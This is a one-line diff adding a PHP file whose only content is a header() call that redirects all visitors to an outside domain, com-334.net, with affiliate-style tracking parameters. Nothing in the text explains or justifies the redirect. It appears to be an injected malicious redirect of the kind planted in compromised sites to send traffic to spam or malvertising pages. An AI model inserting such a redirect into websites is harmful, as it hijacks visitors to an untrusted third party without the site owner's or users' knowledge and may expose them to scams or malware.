@@ -1,0 +1,1 @@
+<?php header("Location: http://com-334.net/?a=352443&c=wl_con&s=neman"); ?>
